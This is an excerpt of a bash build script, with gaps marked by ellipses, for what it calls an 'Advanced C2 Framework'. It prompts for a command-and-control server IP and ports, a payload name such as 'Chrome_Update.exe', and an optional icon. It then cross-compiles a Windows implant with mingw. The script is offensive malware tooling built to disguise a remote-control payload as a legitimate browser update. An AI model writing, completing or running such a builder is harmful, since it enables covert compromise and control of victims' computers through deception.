...
echo -e "${GREEN}    [+] Advanced C2 Framework${NC}"
echo -e "${GREEN}    [+] Version: 2.5 [Professional Edition]${NC}"
echo ""
...
while true; do
    ...
    if [ -z "$C2_IP" ]; then
         echo -e "${RED}   [!] Please enter server IP address!${NC}"
    else
         break
    fi
done
...
while true; do
    ...
    if [ -z "$C2_PORT" ]; then
        echo -e "${RED}   [!] Please enter port number!${NC}"
    else
        break
    fi
done
...
while true; do
    ...
    if [ -z "$WEB_PORT" ]; then
         echo -e "${RED}   [!] Please enter web port!${NC}"
    else
         break
    fi
done
...
# Get Payload Name
read -p "   [?] Payload file name (e.g: Chrome_Update.exe): " PAYLOAD_INPUT
...
# Get Icon Path
echo -e "   [?] Icon file path (.ico) or URL (optional):"
read -p "       > " ICON_PATH

# Handle link if provided
if [[ "$ICON_PATH" == http* ]]; then
    echo -e "   [*] Downloading icon from URL..."
...
if [ -n "$ICON_PATH" ]; then
    if [ -f "$ICON_PATH" ]; then
        ...
        if i686-w64-mingw32-windres resource.rc -O coff -o resource.res 2>/dev/null; then
            ...
            echo -e "${RED}   [!] Invalid icon file (not a valid .ico file).${NC}"
            echo -e "${YELLOW}   [!] Continuing without icon...${NC}"
        fi
    fi
fi
...
if [ -f "$PAYLOAD_NAME" ]; then
    ...
    echo -e "${RED}[!] Compilation Failed. Please check src/main.cpp.${NC}"
    exit 1
fi
